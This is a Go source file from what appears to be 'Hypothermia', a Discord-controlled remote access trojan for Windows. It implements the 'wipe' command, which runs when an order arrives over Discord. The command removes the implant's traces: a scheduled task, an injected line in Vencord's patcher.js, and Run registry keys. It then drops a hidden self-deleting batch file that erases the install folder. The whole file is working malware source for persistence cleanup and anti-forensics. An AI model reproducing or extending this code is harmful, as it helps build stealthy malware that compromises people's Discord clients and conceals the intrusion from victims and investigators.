package commands

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"Hypothermia/config"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	wipeRegError       string = "🟥 Failed to get startup value."
	wipeDelRegError    string = "🟥 Failed to delete startup value."
	wipeDelRegKeyError string = "🟥 Failed to delete settings key."
	wipePathError      string = "🟥 Failed to get the path."
	wipeDelError       string = "🟥 Failed to delete hypothermia."
	wipeKillError      string = "🟥 Failed to kill hypothermia."

	wipeSoftKill string = "🟩 Hypothermia soft killed, will startup on device reset."
)

func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	var kill bool = false
	if len(args) == 1 {
		kill = true
		s.ChannelMessageSendReply(m.ChannelID, wipeSoftKill, m.Reference())
	}

	if !config.Debugging && !kill {
		exec.Command(
			"schtasks", "/delete",
			"/tn", config.RealProcName,
			"/f",
		).Run()

		vencord := filepath.Join(os.Getenv("APPDATA"), "Vencord\\dist\\patcher.js")
		data, err := os.ReadFile(vencord)
		if err == nil {
			dataStr := string(data)
			lines := strings.Split(dataStr, "\n")

			found := false
			var newLines []string

			for _, line := range lines {
				if !found && strings.Contains(line, config.Verifier) {
					found = true
					continue
				}

				if !found {
					newLines = append(newLines, line)
				}
			}

			os.WriteFile(vencord, []byte(strings.Join(newLines, "\n")), 0644)
		}

		_, err = utils.GetRegistryVal(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			config.StartupKeyName,
		)

		checked := false

		if err != nil {
			checked = true
			s.ChannelMessageSendReply(m.ChannelID, wipeRegError, m.Reference())
		}

		err = utils.DelRegistryVal(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			config.StartupKeyName,
		)

		if err != nil && !checked {
			s.ChannelMessageSendReply(m.ChannelID, wipeDelRegError, m.Reference())
			return
		}

		err = utils.DelRegistryKey("SOFTWARE\\Classes\\" + config.StartupKeyName)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, wipeDelRegError, m.Reference())
		}
	}

	path, err := os.Executable()
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, wipePathError, m.Reference())
		return
	}

	path, _ = filepath.Abs(path)
	dir := filepath.Dir(path)

	script := filepath.Join(os.TempDir(), fmt.Sprint(rand.Float32())+"a.bat")
	utils.HideItem(script)

	content := fmt.Sprintf(
		"@echo off\n"+
			":check\n"+
			"tasklist | find \"%s\" >nul\n"+
			"if not errorlevel 1 (\n"+
			"  timeout /t 1 >nul\n"+
			"  goto :check\n"+
			")\n"+
			"timeout /t 2 >nul\n",
		filepath.Base(path),
	)

	if !kill {
		content += fmt.Sprintf("rmdir /s /q \"%s\"\n", dir)
	}

	content += "del \"%%~f0\"\n"

	err = os.WriteFile(script, []byte(content), 0644)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(wipeDelError, err), m.Reference())
		return
	}

	cmd := exec.Command("cmd.exe", "/C", "start", "/b", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	err = cmd.Start()
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, wipeKillError, m.Reference())
		return
	}

	time.Sleep(500 * time.Millisecond)

	os.Exit(0)
}

func (*WipeCommand) Name() string {
	return "wipe"
}

func (*WipeCommand) Info() string {
	return "removes hypothermia and all its traces"
}

type WipeCommand struct{}
